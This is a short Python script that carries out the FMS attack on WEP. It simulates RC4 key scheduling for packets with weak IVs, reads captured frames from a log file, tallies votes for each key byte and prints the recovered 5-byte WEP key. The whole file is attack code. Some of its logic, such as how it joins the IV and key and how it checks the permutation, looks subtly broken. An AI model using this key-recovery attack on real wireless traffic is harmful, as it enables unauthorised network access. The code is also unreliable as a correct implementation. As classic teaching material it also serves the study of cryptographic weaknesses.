import struct

def sim_resol(iv, key, byte_index, out):
    """ Simulates part of the RC4 key scheduling. """
    s = list(range(256))
    tmp_key = iv + key
    j = k = 0
    
    for i in range(byte_index + 3):
        j = (j + s[i] + tmp_key[k]) % 256
        s[i], s[j] = s[j], s[i]
        if k < len(tmp_key) - 1:
            k += 1
        else:
            k = 0

    s_1 = s.index(out) if out in s else -1
    if s[0] != byte_index + 3 or s[1] != 0:
        return -1
    return (s_1 - j - s[byte_index + 3]) % 256

def crack_wep(wep_file):
    key = bytearray(5)
    
    for byte_index in range(len(key)):
        counts = [0] * 256
        
        with open(wep_file, "rb") as fd:
            while True:
                tmp_line = fd.read(143)  # Read packet
                if not tmp_line:
                    break

                if tmp_line[24] == byte_index + 3 and tmp_line[25] == 255:
                    out = ord('C') ^ tmp_line[27]  # Assuming 'C' is the plaintext byte
                    tmp = sim_resol(tmp_line[24:27], key, byte_index, out)
                    if 0 <= tmp <= 255:
                        counts[tmp] += 1

        # Find the key byte
        max_count = max(counts)
        key[byte_index] = counts.index(max_count)

    print("Recovered key:", key.decode('latin-1'))

if __name__ == "__main__":
    crack_wep("logs/log1.wep")
